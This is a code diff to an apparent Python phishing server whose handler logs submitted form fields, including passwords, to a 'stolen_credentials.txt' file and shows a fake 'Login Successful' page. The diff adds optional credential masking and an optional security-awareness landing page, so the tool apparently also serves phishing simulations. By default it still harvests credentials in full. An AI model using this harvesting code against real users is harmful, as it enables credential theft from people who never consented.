@@ -373,22 +373,60 @@ class PhishingHandler(BaseHTTPRequestHandler):
                 print(Fore.YELLOW + f"   {key}: {value}")
 
         # Save to file
+        mask_sensitive = config.get("data_protection", {}).get("mask_credentials", False)
+        sensitive_keywords = ["pass", "password", "secret", "pin", "ssn", "token"]
+
         if config.get("capture", {}).get("save_credentials", True):
             credentials_path = os.path.join(target_folder, "stolen_credentials.txt")
             with open(credentials_path, "a", encoding="utf-8") as f:
                 f.write(f"IP: {ip}\nTime: {timestamp}\n")
                 for key, values in parsed_data.items():
                     for value in values:
-                        f.write(f"{key}: {value}\n")
+                        is_sensitive = any(k in key.lower() for k in sensitive_keywords)
+                        display_val = "[MASKED_FOR_SAFETY]" if (mask_sensitive and is_sensitive) else value
+                        f.write(f"{key}: {display_val}\n")
                 f.write("=" * 40 + "\n")
             print(Fore.CYAN + f"[+] Credentials saved to: {credentials_path}")
             logger.info(f"Credentials captured from {ip} -> {credentials_path}")
 
-        # Respond
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
-        self.wfile.write(b"<html><body><h2>Login Successful</h2></body></html>")
+        # Check for Security Awareness Landing Page mode
+        awareness_cfg = config.get("awareness_mode", {})
+        if awareness_cfg.get("enabled", False):
+            custom_msg = awareness_cfg.get("custom_message", "This was a simulated security awareness exercise.")
+            awareness_html = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Awareness Notice</title>
+    <style>
+        body {{ font-family: system-ui, -apple-system, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }}
+        .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 12px; max-width: 600px; padding: 2rem; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); }}
+        h2 {{ color: #f43f5e; margin-top: 0; }}
+        ul {{ background: #0f172a; padding: 1rem 1.5rem; border-radius: 8px; line-height: 1.6; }}
+        .btn {{ display: inline-block; background: #3b82f6; color: white; text-decoration: none; padding: 0.75rem 1.5rem; border-radius: 6px; font-weight: 600; margin-top: 1rem; }}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>⚠️ Security Awareness Exercise</h2>
+        <p>{custom_msg}</p>
+        <p><strong>Key Security Tips:</strong></p>
+        <ul>
+            <li>Always check the domain name in the address bar before entering credentials.</li>
+            <li>Be cautious of links received in unexpected emails or messages.</li>
+            <li>Report suspicious login prompts to your IT Security Operations team.</li>
+        </ul>
+    </div>
+</body>
+</html>"""
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write(awareness_html.encode("utf-8"))
+        else:
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write(b"<html><body><h2>Login Successful</h2></body></html>")
 
     def _handle_system_info(self, ip, timestamp):
         """Handle system fingerprint data."""
